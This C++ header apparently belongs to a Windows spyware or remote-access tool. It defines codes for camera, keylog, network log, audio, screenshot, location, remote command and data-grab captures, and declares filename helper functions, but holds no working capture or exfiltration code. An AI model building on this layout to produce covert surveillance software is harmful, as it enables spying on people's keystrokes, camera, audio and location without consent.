#pragma once

#include <Windows.h>
#include <string>
#include <map>
#include "../DataManagement/converters.h"
#pragma comment(lib, "rpcrt4.lib")
#include <rpc.h>

#define DATA_FOLDER_PATH "temp/"

#define Camera "CAMERA"
#define Keylog "KEYLOG"
#define Netlog "NETLOG"
#define Audio "AUDIO"
#define Screenshot "SCREENSHOT"
#define Lockdown "LOCKDOWN"
#define Command "COMMAND"
#define Location "LOCATION"
#define DataGrab "DATA_GRAB"

#define Command_Type "COMMAND_TYPE"
#define Command_Param "COMMAND_PARAMETER"

#define CAMERA_CODE "CA"
#define AUDIO_CODE "AU"
#define SCREENSHOT_CODE "SC"
#define KEYLOG_CODE "KL"
#define NETLOG_CODE "NL"
#define CMD_CODE "CM"
#define LOCATION_CODE "LC"
#define DATA_GRAB_CODE "DG"
#define TEMP_CODE "00"
#define UNDEFINED_CODE ""

#pragma warning(disable:4996) // Disable "unsafe" warnings

using namespace std;

wstring buildFilterPath(wstring finalFilterPath, map<string, string> configs, const char* type);
string checkDataType(char* filename);
string constructFilename(const char* typeCode);
string getRandomString(const int len);